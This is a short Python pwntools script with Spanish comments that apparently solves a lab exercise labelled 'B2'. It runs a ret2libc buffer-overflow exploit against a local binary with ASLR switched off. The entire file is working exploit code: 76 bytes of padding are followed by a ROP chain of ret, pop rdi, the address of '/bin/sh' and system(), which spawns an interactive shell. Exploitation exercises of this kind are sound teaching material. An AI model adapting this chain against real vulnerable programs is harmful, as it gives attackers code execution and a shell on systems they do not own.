#!/usr/bin/env python3
# B2: ret2libc estatico+ASLR off (base de libc fija)
from pwn import context, process, ELF, p64, log, asm
context.binary = "./bin/b2"
elf  = ELF("./bin/b2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
OFFSET = 76
# Base de libc con ASLR off (leer con: setarch x86_64 -R ldd ./bin/b2):
BASE_LIBC = 0x00007ffff7d90000  # ajustar
libc.address = BASE_LIBC
system = libc.symbols["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))
# pop rdi; ret en libc (varia; hallar con ROPgadget):
pop_rdi_ret = BASE_LIBC + 0x2a3e5  # ajustar
ret = pop_rdi_ret + 1
log.info(f"system @ {hex(system)}, /bin/sh @ {hex(binsh)}, pop rdi @ {hex(pop_rdi_ret)}")
payload = b"A"*OFFSET + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
io = process(["setarch", "x86_64", "-R", "./bin/b2"])
io.sendline(payload)
io.interactive()
